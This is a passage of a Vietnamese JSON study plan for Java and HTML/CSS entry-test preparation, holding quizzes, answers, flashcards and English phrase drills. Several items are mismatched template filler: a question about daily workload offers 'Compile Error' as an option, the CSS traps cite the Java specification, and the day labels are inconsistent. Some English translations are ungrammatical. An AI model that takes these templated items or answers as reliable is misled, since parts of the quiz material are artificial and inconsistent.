        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace đa hình đa tầng (Multi-level Polymorphism)",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nclass A { void m() { System.out.print(\"A\"); } }\nclass B extends A { void m() { System.out.print(\"B\"); } }\nclass C extends B { void m() { System.out.print(\"C\"); } }\npublic class Test {\n    public static void main(String[] args) {\n        A obj = new C();\n        obj.m();\n    }\n}\n```\nKết quả in ra là gì?",
              "ans": "In ra: `C`. Đối tượng thực tế trên Heap được tạo từ `new C()`, nên dù gán cho tham chiếu kiểu `A`, cơ chế Virtual Method Invocation sẽ gọi phương thức `m()` ở lớp cụ thể nhất là `C`."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy gọi super.super trong Java",
          "questions": [
            {
              "q": "Trong class con `C` kế thừa `B`, có thể dùng cú pháp `super.super.m()` để gọi phương thức của class ông nội `A` được không?",
              "ans": "Không thể! Cú pháp `super.super` là không hợp lệ trong Java để đảm bảo tính đóng gói (Encapsulation)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Đa hình với biến static trong kế thừa",
          "questions": [
            {
              "q": "Cho `class Parent { static int x = 1; }` và `class Child extends Parent { static int x = 2; }`. Biểu thức `Parent p = new Child(); System.out.println(p.x);` in ra gì?",
              "ans": "In ra: 1. Biến static không có tính đa hình, được truy cập dựa trên kiểu của tham chiếu (`Parent`) tại thời điểm biên dịch."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_33_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề OOP, Inheritance, Polymorphism, Overriding?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của OOP, Inheritance, Polymorphism, Overriding phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần OOP, Inheritance, Polymorphism, Overriding."
        },
        {
          "id": "da_33_2",
          "q": "Khi thao tác với OOP, Inheritance, Polymorphism, Overriding, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Phương thức có từ khóa `private` ở lớp cha có thể bị Override ở lớp con không?",
          "a": "KHÔNG THỂ. Lớp con không nhìn thấy phương thức private của cha nên không thể Override. Nếu con khai báo một method trùng tên thì đó chỉ là một phương thức MỚI hoàn toàn của con, không có liên hệ đa hình với cha.",
          "trap": "Gắn `@Override` lên method đó ở con sẽ bị trình biên dịch báo lỗi ngay!"
        }
      ],
      "dailyEnglish": [
        {
          "id": 18,
          "vi": "(Export tất cả dữ liệu về ngày nghỉ trong database)",
          "en": "Export all data of days off in database"
        },
        {
          "id": 19,
          "vi": "(Khai báo biến flag để lưu chỉ số của vị trí mà xảy ra sự thay đổi của \"year\" )",
          "en": "Declare \"FLAG\" variables to save the index of location which occurs the change of year"
        },
        {
          "id": 20,
          "vi": "(Check nếu các object có cùng năm thì export ra cùng 1 sheet, ngược lại nếu khác năm thì export ra các sheet các nhau)",
          "en": "Check if objects have same year, then export into the same sheet, else, export into different sheet"
        },
        {
          "id": 21,
          "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
          "en": "check existion of data from database"
        },
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        }
      ]
    },
    "34": {
      "day": 34,
      "week": 5,
      "title": "TestKing Marathon Part 5 (Câu 181 - 240)",
      "topics": [
        "String, Wrapper, Math, Collections, Generics"
      ],
      "tasks": [
        "Hoàn thành 60 câu TestKing",
        "Ghi chú các câu về equals/hashCode và TreeSet ordering"
      ],
      "englishDrill": [
        {
          "id": 21,
          "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
          "en": "check existion of data from database"
        },
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        },
        {
          "id": 23,
          "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
          "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
        },
        {
          "id": 24,
          "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
          "en": "Get list from table ABC by inputted conditions"
        },
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        }
      ],
      "summary": "TestKing Marathon Đợt 6: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Hai chuỗi `String s1 = \"Java\";` và `String s2 = new String(\"Java\");` thì `s1 == s2` và `s1.equals(s2)` trả về kết quả gì?",
          "a": "`s1 == s2` trả về `false` (s1 nằm trong String Pool, s2 là object độc lập trên Heap). `s1.equals(s2)` trả về `true` (so sánh nội dung chuỗi ký tự)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: String, Wrapper, Math, Collections, Generics.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_34_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Bẫy Collections & Generics trong TestKing Ch6",
          "questions": [
            {
              "q": "Phần tử thêm vào `HashSet` bắt buộc phải thỏa mãn điều kiện gì để không bị trùng lặp?",
              "ans": "Class của phần tử đó bắt buộc phải override đúng và tương thích cả hai phương thức `equals()` và `hashCode()`."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Type Erasure trong Generics",
          "questions": [
            {
              "q": "Hiện tượng Type Erasure trong Java Generics là gì?",
              "ans": "Java compiler chỉ kiểm tra an toàn kiểu của Generics ở thời điểm biên dịch. Khi chuyển thành mã byte-code, thông tin kiểu cụ thể (`<String>`, `<Integer>`) bị xóa sạch và thay bằng `Object` (hoặc bounded type) kèm ép kiểu ngầm định để tương thích ngược với các phiên bản Java cũ."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace Collections.sort() với Comparator",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nList<Integer> list = Arrays.asList(3, 1, 2);\nCollections.sort(list, (a, b) -> b - a);\nSystem.out.println(list);\n```\nKết quả in ra là gì?",
              "ans": "In ra: `[3, 2, 1]`. Biểu thức lambda `b - a` đảo ngược thứ tự so sánh tự nhiên, sắp xếp danh sách theo thứ tự giảm dần."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Arrays.asList() trả về List cố định",
          "questions": [
            {
              "q": "Đoạn code `List<String> list = Arrays.asList(\"A\", \"B\"); list.add(\"C\");` ném ra ngoại lệ gì lúc runtime?",
              "ans": "Ném `java.lang.UnsupportedOperationException`! `Arrays.asList()` trả về một `List` có kích thước cố định bọc quanh mảng gốc, không hỗ trợ thao tác thêm hoặc xóa phần tử (`add`, `remove`)."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "Bounded Wildcards: PECS rule",
          "questions": [
            {
              "q": "Nguyên tắc PECS (Producer Extends, Consumer Super) trong Java Generics áp dụng như thế nào?",
              "ans": "Dùng `? extends T` khi tập hợp đóng vai trò Producer (chỉ đọc dữ liệu ra). Dùng `? super T` khi tập hợp đóng vai trò Consumer (chỉ ghi dữ liệu vào)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_34_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề String, Wrapper, Math, Collections, Generics?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của String, Wrapper, Math, Collections, Generics phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần String, Wrapper, Math, Collections, Generics."
        },
        {
          "id": "da_34_2",
          "q": "Khi thao tác với String, Wrapper, Math, Collections, Generics, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "So sánh hai interface sắp xếp: `Comparable` và `Comparator`?",
          "a": "- `Comparable` (trong `java.lang`): Định nghĩa thứ tự sắp xếp TỰ NHIÊN cho chính đối tượng, override method `compareTo(T o)`.\n- `Comparator` (trong `java.util`): Định nghĩa thứ tự sắp xếp TÙY CHỌN từ bên ngoài, override method `compare(T o1, T o2)`.",
          "trap": "TreeSet hoặc Collections.sort() bắt buộc object phải implement Comparable nếu không truyền Comparator."
        }
      ],
      "dailyEnglish": [
        {
          "id": 21,
          "vi": "Ham kiem tra du lieu co ton tai trong database hay khong",
          "en": "check existion of data from database"
        },
        {
          "id": 22,
          "vi": "Kiem tra yeu cau update va delete tu client, neu co loi thi khong thuc hien",
          "en": "Check requirements of updating and deleting from client, if errors appear, do not execute"
        },
        {
          "id": 23,
          "vi": "Kiem tra update chuyen trang, neu update bang click button next thi chuyen sang trang tiep theo",
          "en": "Check update of swifting pages, if update by clicking button NEXT, forward to next page"
        },
        {
          "id": 24,
          "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
          "en": "Get list from table ABC by inputted conditions"
        },
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        }
      ]
    },
    "35": {
      "day": 35,
      "week": 5,
      "title": "TestKing Marathon Part 6 (Câu 241 - 294) + Mock Mid-term",
      "topics": [
        "Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu"
      ],
      "tasks": [
        "Hoàn thành 54 câu cuối cùng",
        "Làm đề thi thử 20 câu tổng hợp (Java/SQL/Web)"
      ],
      "englishDrill": [
        {
          "id": 24,
          "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
          "en": "Get list from table ABC by inputted conditions"
        },
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        },
        {
          "id": 26,
          "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
          "en": "Do not input space at the beginning of string"
        },
        {
          "id": 27,
          "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
          "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
        },
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        }
      ],
      "summary": "TestKing Marathon Đợt 7: Cày 40-50 câu/ngày, đọc code phát hiện bẫy cú pháp.",
      "coreTheory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
      "codeSnippet": "// TestKing Code Tracing Practice",
      "traps": [
        "Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++."
      ],
      "quickQuiz": [
        {
          "q": "Gọi phương thức `t.run()` thay vì `t.start()` trên một Thread object thì điều gì sẽ xảy ra?",
          "a": "Không có luồng mới nào được tạo ra! Phương thức `run()` chỉ chạy tuần tự như một hàm Java bình thường ngay trên luồng gọi nó (ví dụ main thread)."
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟠 HIGH (SQL & Web & TestKing)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### Quy trình cày TestKing chuẩn phản xạ:\n1. Đọc kỹ câu hỏi, **tuyệt đối không xem đáp án trước**.\n2. Phân tích: Đoạn code này compile được không? Dòng nào có nguy cơ lỗi?\n3. Nếu compile được: Output là gì? Có ném exception lúc chạy không?\n4. Chọn đáp án -> Kiểm tra -> Nếu sai, ghi ngay vào **Error Notebook**.\n5. Tự viết 1 ví dụ code tương tự trên IDE để chứng minh tại sao đáp án đó đúng.\n",
          "code": "// TestKing Code Tracing Practice"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_35_1",
          "level": "Easy",
          "question": "Hôm nay cần hoàn thành bao nhiêu câu TestKing?",
          "code": "// TestKing Code Tracing Practice",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "40 - 50 câu không nhìn đáp án."
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: Học thuộc đáp án sẽ thất bại nếu đề thi thật chỉ cần đổi 1 dấu chấm phẩy hoặc toán tử ++.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "// TestKing Code Tracing Practice",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "Bẫy đa luồng TestKing Ch7",
          "questions": [
            {
              "q": "Phương thức nào sau đây giải phóng monitor lock: `Thread.sleep(1000)` hay `Object.wait()`?",
              "ans": "`Object.wait()` giải phóng lock. `Thread.sleep()` không giải phóng lock."
            }
          ]
        },
        {
          "level": "Level 2: Understanding",
          "desc": "Từ khóa synchronized trên method",
          "questions": [
            {
              "q": "Khối lệnh `synchronized(this) { ... }` và khai báo `public synchronized void m() { ... }` có monitor lock giống nhau không?",
              "ans": "Hoàn toàn giống nhau! Cả hai đều giành khóa monitor lock trên chính đối tượng thể hiện `this`."
            }
          ]
        },
        {
          "level": "Level 3: Code Tracing",
          "desc": "Trace AtomicInteger increment",
          "questions": [
            {
              "q": "Cho đoạn code sau:\n```java\nAtomicInteger ai = new AtomicInteger(10);\nai.compareAndSet(10, 20);\nai.compareAndSet(10, 30);\nSystem.out.println(ai.get());\n```\nKết quả in ra là gì?",
              "ans": "In ra: 20. Lệnh đầu tiên kiểm tra thấy giá trị đang là 10 nên cập nhật thành 20 (trả về true). Lệnh thứ hai kiểm tra thấy giá trị hiện tại là 20 (không phải 10) nên không thực hiện cập nhật (trả về false). Giá trị cuối cùng là 20."
            }
          ]
        },
        {
          "level": "Level 4: Exam Trap",
          "desc": "Bẫy Thread.yield()",
          "questions": [
            {
              "q": "Gọi phương thức `Thread.yield()` có đảm bảo luồng khác sẽ được thực thi ngay lập tức không?",
              "ans": "Không đảm bảo! `yield()` chỉ là một lời gợi ý cho bộ lập lịch của hệ điều hành (Thread Scheduler) rằng luồng hiện tại sẵn sàng nhường CPU. Bộ lập lịch có thể bỏ qua gợi ý này."
            }
          ]
        },
        {
          "level": "Level 5: Challenge",
          "desc": "ReentrantLock vs synchronized",
          "questions": [
            {
              "q": "Kể tên 2 tính năng vượt trội của `ReentrantLock` so với khối `synchronized` truyền thống.",
              "ans": "1) Khả năng thử lấy khóa không bị chặn vô hạn thông qua `tryLock(timeout)`. 2) Hỗ trợ khóa công bằng (Fairness Lock: luồng chờ lâu nhất được ưu tiên lấy khóa trước)."
            }
          ]
        }
      ],
      "dailyAssessment": [
        {
          "id": "da_35_1",
          "q": "Về mặt kỹ thuật, khẳng định nào sau đây là CHÍNH XÁC NHẤT về chuyên đề Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu?",
          "options": [
            "Đặc tả Java quy định cú pháp và cơ chế của Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu phải được kiểm tra chặt chẽ tại compile-time hoặc runtime",
            "Chỉ hoạt động được trên hệ điều hành Windows",
            "Không bao giờ xảy ra ngoại lệ khi thực thi",
            "Bị cấm sử dụng trong các dự án thực tế"
          ],
          "correct": 0,
          "exp": "Khẳng định 1 tuân thủ đúng chuẩn kiến trúc và đặc tả ngôn ngữ Java cho phần Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu."
        },
        {
          "id": "da_35_2",
          "q": "Khi thao tác với Inner Classes & Threads, Hoàn tất vòng 1 TestKing 294 câu, lỗi nào phổ biến nhất?",
          "options": [
            "Lỗi cú pháp (Compile Error)",
            "NullPointerException",
            "ArrayIndexOutOfBoundsException",
            "StackOverflowError"
          ],
          "correct": 0,
          "exp": "Người học thường gặp lỗi biên dịch do không nắm chắc quy tắc định danh hoặc kiểu dữ liệu."
        }
      ],
      "dailyFlashcards": [
        {
          "q": "Phương thức `Thread.sleep(ms)` và `Object.wait()` khác nhau như thế nào về việc giữ Khóa (Lock Monitor)?",
          "a": "- `Thread.sleep()`: Tạm dừng luồng nhưng VẪN TIẾP TỤC GIỮ KHÓA (không giải phóng lock), khiến các thread khác chờ lock không vào được.\n- `Object.wait()`: Tạm dừng luồng và GIẢI PHÓNG TOÀN BỘ KHÓA đang giữ, nhường quyền cho các thread khác chạy.",
          "trap": "Đây là câu hỏi vấn đáp lý thuyết đa luồng được hỏi nhiều nhất trong các kỳ thi entry test."
        }
      ],
      "dailyEnglish": [
        {
          "id": 24,
          "vi": "Ham lay danh sach tu table ABC theo cac dieu kien nhap vao",
          "en": "Get list from table ABC by inputted conditions"
        },
        {
          "id": 25,
          "vi": "Ham update va delete record trong database, tra ve vi tri loi neu co",
          "en": "Function of updating and deleting record in database"
        },
        {
          "id": 26,
          "vi": "Bạn không nhập space đâu chuổi vì nó không có ý nghĩa",
          "en": "Do not input space at the beginning of string"
        },
        {
          "id": 27,
          "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
          "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
        },
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        }
      ]
    },
    "36": {
      "day": 36,
      "week": 6,
      "title": "Frontend Essentials: HTML5 & CSS3",
      "topics": [
        "HTML Semantic tags (form, input, table, div, span)",
        "CSS Box Model (content, padding, border, margin)",
        "display: block, inline, inline-block, flex, none",
        "display: none vs visibility: hidden",
        "CSS positioning: static, relative, absolute, fixed"
      ],
      "tasks": [
        "Luyện trả lời câu hỏi Audit: Box Model là gì? display:none khác visibility:hidden thế nào?",
        "Code giao diện form đăng nhập đơn giản"
      ],
      "englishDrill": [
        {
          "id": 27,
          "vi": "Tháng 2 không phải năm nhuận không có ngày 29, 30, 31",
          "en": "If the current year is non-leap year, February does not contain the day 29, 30, 31"
        },
        {
          "id": 28,
          "vi": "Bạn vui lòng nhập định dạng giờ không lớn hơn 24",
          "en": "Please input hour format without greater than 24"
        },
        {
          "id": 29,
          "vi": "Nếu trường thành phố và trường tên không rỗng thì tìm kiếm theo 2 điều kiện trên",
          "en": "If fields of city and name are not null, search by 2 above conditions"
        },
        {
          "id": 30,
          "vi": "Nếu trường thành phố, năm và tên  rỗng thì hiện tất cả các danh sách từ bảng Trainer.",
          "en": "If fields of city, year and name are null, show all lists from Trainer table"
        },
        {
          "id": 31,
          "vi": "Kiễm tra khi click nút xóa thì sẽ hiện lên bảng thông báo",
          "en": "Check if clicking button DELETE, show on NOTICE"
        }
      ],
      "summary": "Frontend Essentials: HTML5 Semantic & CSS Box Model, Display, Positioning.",
      "coreTheory": "\n### 1. CSS Box Model (Mô hình hộp)\n- Gồm 4 lớp từ trong ra ngoài: **Content $\\rightarrow$ Padding $\\rightarrow$ Border $\\rightarrow$ Margin**.\n- `box-sizing: border-box`: Tính chiều rộng `width` bao gồm cả padding và border, giúp giao diện không bị vỡ.\n\n### 2. display: none vs visibility: hidden (Bẫy Audit)\n- `display: none`: Ẩn hoàn toàn, **KHÔNG CHIẾM KHOẢNG TRỐNG** trên trang web.\n- `visibility: hidden`: Ẩn phần tử nhưng **VẪN CHIẾM NGUYÊN VỊ TRÍ KÍCH THƯỚC** (để lại khoảng trắng).\n\n### 3. CSS Positioning\n- `static` (mặc định), `relative` (tương đối theo vị trí gốc), `absolute` (tuyệt đối theo cha có position khác static), `fixed` (cố định theo màn hình).\n",
      "codeSnippet": "* {\n    box-sizing: border-box; /* Chuẩn thiết kế hiện đại */\n}\n.hidden-box { display: none; }        /* Biến mất, không tốn chỗ */\n.invisible-box { visibility: hidden; } /* Vô hình nhưng vẫn giữ chỗ */",
      "traps": [
        "display: none không tốn chỗ, visibility: hidden vẫn chiếm chỗ.",
        "position: absolute nếu không có cha định vị sẽ lấy toàn bộ trang web (body) làm gốc."
      ],
      "quickQuiz": [
        {
          "q": "Kể tên 4 thành phần Box Model từ trong ra ngoài:",
          "a": "Content -> Padding -> Border -> Margin"
        }
      ],
      "estimatedTime": "3h 00m",
      "difficulty": "⭐⭐⭐",
      "priority": "🟡 MEDIUM (FEE & Audit Practice)",
      "source": "Sun Certified Programmer Study Guide (SCJP) & TestKing",
      "objectives": [
        "Nắm vững toàn diện lý thuyết chuyên sâu về: HTML Semantic tags (form, input, table, div, span), CSS Box Model (content, padding, border, margin), display: block, inline, inline-block, flex, none.",
        "Luyện phản xạ bẫy đề thi và phân tích cơ chế JVM / Runtime.",
        "Hoàn thành các bài tập phân tích dòng chảy mã nguồn (Code Tracing) và kiểm tra đạt chuẩn."
      ],
      "whyMatters": "Chủ đề này xuất hiện thường xuyên trong đề thi Entry Test và các câu hỏi vấn đáp 1-1 Audit của FSOFT.",
      "prerequisites": "Kiến thức của các ngày học trước đó trong lộ trình.",
      "parts": [
        {
          "id": "part1",
          "title": "Part 1: Lý Thuyết Trọng Tâm & Nguyên Tắc Vàng",
          "sourceRef": "SCJP Objectives & Tài liệu nguồn",
          "theory": "\n### 1. CSS Box Model (Mô hình hộp)\n- Gồm 4 lớp từ trong ra ngoài: **Content $\\rightarrow$ Padding $\\rightarrow$ Border $\\rightarrow$ Margin**.\n- `box-sizing: border-box`: Tính chiều rộng `width` bao gồm cả padding và border, giúp giao diện không bị vỡ.\n\n### 2. display: none vs visibility: hidden (Bẫy Audit)\n- `display: none`: Ẩn hoàn toàn, **KHÔNG CHIẾM KHOẢNG TRỐNG** trên trang web.\n- `visibility: hidden`: Ẩn phần tử nhưng **VẪN CHIẾM NGUYÊN VỊ TRÍ KÍCH THƯỚC** (để lại khoảng trắng).\n\n### 3. CSS Positioning\n- `static` (mặc định), `relative` (tương đối theo vị trí gốc), `absolute` (tuyệt đối theo cha có position khác static), `fixed` (cố định theo màn hình).\n",
          "code": "* {\n    box-sizing: border-box; /* Chuẩn thiết kế hiện đại */\n}\n.hidden-box { display: none; }        /* Biến mất, không tốn chỗ */\n.invisible-box { visibility: hidden; } /* Vô hình nhưng vẫn giữ chỗ */"
        }
      ],
      "codeTracing": [
        {
          "id": "ct_36_1",
          "level": "Easy",
          "question": "Kể tên 4 thành phần Box Model từ trong ra ngoài:",
          "code": "* {\n    box-sizing: border-box; /* Chuẩn thiết kế hiện đại */\n}\n.hidden-box { display: none; }        /* Biến mất, không tốn chỗ */\n.invisible-box { visibility: hidden; } /* Vô hình nhưng vẫn giữ chỗ */",
          "options": [
            "Đúng theo dự đoán",
            "Compile Error",
            "Runtime Exception",
            "Khác"
          ],
          "correctIndex": 0,
          "explanation": "Content -> Padding -> Border -> Margin"
        }
      ],
      "examTraps": [
        {
          "trap": "Cạm bẫy 1: display: none không tốn chỗ, visibility: hidden vẫn chiếm chỗ.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "* {\n    box-sizing: border-box; /* Chuẩn thiết kế hiện đại */\n}\n.hidden-box { display: none; }        /* Biến mất, không tốn chỗ */\n.invisible-box { visibility: hidden; } /* Vô hình nhưng vẫn giữ chỗ */",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        },
        {
          "trap": "Cạm bẫy 2: position: absolute nếu không có cha định vị sẽ lấy toàn bộ trang web (body) làm gốc.",
          "whyPeopleWrong": "Do thói quen lập trình hoặc nhầm lẫn giữa các quy tắc cú pháp.",
          "wrongThinking": "Áp dụng tư duy cảm tính thay vì bám sát đặc tả của Java.",
          "correctRule": "Luôn kiểm tra kiểu dữ liệu, phạm vi biến và tính hợp lệ trước khi thực thi.",
          "code": "* {\n    box-sizing: border-box; /* Chuẩn thiết kế hiện đại */\n}\n.hidden-box { display: none; }        /* Biến mất, không tốn chỗ */\n.invisible-box { visibility: hidden; } /* Vô hình nhưng vẫn giữ chỗ */",
          "miniCheck": "Quy tắc cốt lõi: Nắm chắc đặc tả ngôn ngữ để tránh mất điểm."
        }
      ],
      "practiceExercises": [
        {
          "level": "Level 1: Recall",
          "desc": "HTML5 Semantic & CSS Box Model",
          "questions": [
            {
